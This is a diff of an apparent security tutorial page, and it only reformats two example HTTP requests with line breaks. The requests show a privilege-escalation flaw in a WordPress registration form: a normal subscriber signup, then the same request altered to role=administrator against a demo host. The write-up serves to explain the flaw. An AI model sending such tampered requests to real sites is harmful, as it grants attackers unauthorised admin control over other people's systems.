@@ -149,19 +149,19 @@
     This allows us (as an attacker or researcher) to see how the registration process works and what the request looks like.
     A normal registration request could look something like this:<br>
     <code>
-        POST /register/ HTTP/1.1
-        Host: nicks-demo-target.com
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
-        Content-Type: application/x-www-form-urlencoded
-        Content-Length: 100<br>
-        username=normaluser&
-        email=normaluser@normal.com&
-        role=subscriber&
-        password=basicPassword123!&
-        confirm_password=basicPassword123!&
-        form_id=4&
-        ur-frontend-form-id=4&
-        _wpnonce=abc123def456ghi789jkl012mno345pqr678stu901vwx234yz567890
+        POST /register/ HTTP/1.1<br>
+        Host: nicks-demo-target.com<br>
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)<br>
+        Content-Type: application/x-www-form-urlencoded<br>
+        Content-Length: 100<br><br>
+        username=normaluser&<br>
+        email=normaluser@normal.com&<br>
+        role=subscriber&<br>
+        password=basicPassword123!&<br>
+        confirm_password=basicPassword123!&<br>
+        form_id=4&<br>
+        ur-frontend-form-id=4&<br>
+        _wpnonce=abc123def456ghi789jkl012mno345pqr678stu901vwx234yz567890<br>
     </code><br>
 
     After sending and intercepting this normal registration request, we can modify the request to specify an admin role
@@ -171,19 +171,19 @@
     can simply change the <code>role=subscriber</code> to <code>role=administrator</code> and send the request. The modified
     request would look something like this:<br>
     <code>
-        POST /register/ HTTP/1.1
-        Host: nicks-demo-target.com
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
-        Content-Type: application/x-www-form-urlencoded
-        Content-Length: 100<br>
-        username=hackerman&
-        email=hackerman@hacktheplanet.ru&
-        role=administrator&
-        password=superSecretPassword666!!!&
-        confirm_password=superSecretPassword666!!!&
-        form_id=4&
-        ur-frontend-form-id=4&
-        _wpnonce=abc123def456ghi789jkl012mno345pqr678stu901vwx234yz567890
+        POST /register/ HTTP/1.1<br>
+        Host: nicks-demo-target.com<br>
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)<br>
+        Content-Type: application/x-www-form-urlencoded<br>
+        Content-Length: 100<br><br>
+        username=hackerman&<br>
+        email=hackerman@hacktheplanet.ru&<br>
+        role=administrator&<br>
+        password=superSecretPassword666!!!&<br>
+        confirm_password=superSecretPassword666!!!&<br>
+        form_id=4&<br>
+        ur-frontend-form-id=4&<br>
+        _wpnonce=abc123def456ghi789jkl012mno345pqr678stu901vwx234yz567890<br>
     </code><br>
 
 </p>
